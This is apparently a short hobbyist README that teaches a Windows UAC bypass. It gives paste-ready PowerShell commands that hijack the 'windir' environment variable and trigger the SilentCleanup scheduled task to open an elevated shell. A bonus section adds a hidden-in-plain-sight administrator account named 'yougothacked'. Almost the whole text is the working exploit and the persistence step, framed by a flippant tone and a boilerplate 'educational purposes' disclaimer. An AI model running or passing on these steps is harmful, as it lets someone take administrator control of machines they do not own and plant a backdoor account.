## How to get admin without an admin UAC prompt?

### Bypassing the UAC via powershell and schtasks

- Press the Windows button and the R key at the same time
- Enter one command line and press enter repeat after every command line

```ps
powershell -c "New-ItemProperty \"HKCU:\Environment\" -Name \"windir\" -Value \"cmd.exe /k cmd.exe\" -PropertyType String -Force"
powershell -c "schtasks.exe /Run /TN \Microsoft\Windows\DiskCleanup\SilentCleanup /I"
powershell -c "New-ItemProperty \"HKCU:\Environment\" -Name \"windir\" -Value \"C:\Windows\" -PropertyType String -Force"
```

Voila, an admin shell pops up and you got admin rights!

## Bonus (Creating a new user account and giving it admin permissons)

- Press the Windows button and the R key at the same time
- Enter one command line and press enter repeat after every command line

```ps
net user /add yougothacked *
net localgroup administrators /add yougothacked
```

### Thats it, wasn´t it easy lmao?

Uhm contact me at [contact@phoenixthrush.com](mailto:contact@phoenixthrush.com) if you have questions! <br/>

### Disclaimer!

It´s illegal if you don´t do it on your own pc or permisson of someone else! </br>
This tutorial only contains scripts for educational purposes! </br>
I am not liable for anything that may happen!
